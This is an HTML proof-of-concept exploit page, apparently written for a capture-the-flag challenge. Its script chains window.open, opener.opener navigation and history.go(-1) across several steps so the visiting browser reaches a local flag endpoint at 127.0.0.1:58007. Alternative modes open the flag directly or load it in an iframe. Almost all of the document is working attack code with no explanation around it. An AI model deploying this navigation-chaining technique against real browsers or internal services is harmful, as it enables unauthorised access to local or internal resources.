<!doctype html>
<meta charset="utf-8">
<title>poc</title>
<pre id="out">boot</pre>
<script>
const FLAG = "http://127.0.0.1:58007/flag";
const step = new URLSearchParams(location.search).get("step") || "start";
const ORIGIN = location.href.split("?")[0];
document.getElementById("out").textContent = "step="+step;
if (step === "start") {
  window.open(ORIGIN + "?step=helper");
  location = FLAG;
} else if (step === "helper") {
  window.open(ORIGIN + "?step=ctrl");
  setTimeout(() => { location = FLAG; }, 250);
} else if (step === "ctrl") {
  setTimeout(() => {
    try { opener.opener.location = ORIGIN + "?step=back"; }
    catch (e) {
      try { opener.location = ORIGIN + "?step=back"; } catch (e2) {}
    }
  }, 550);
} else if (step === "back") {
  history.go(-1);
} else if (step === "simple") {
  window.open(FLAG);
  setTimeout(() => { location = FLAG; }, 400);
} else if (step === "iframe") {
  document.body.innerHTML = '<iframe src="'+FLAG+'" width=800 height=400></iframe>';
} else if (step === "hdr") {
  document.body.innerHTML = "<pre>JS works. UA="+navigator.userAgent+"</pre>";
}
</script>
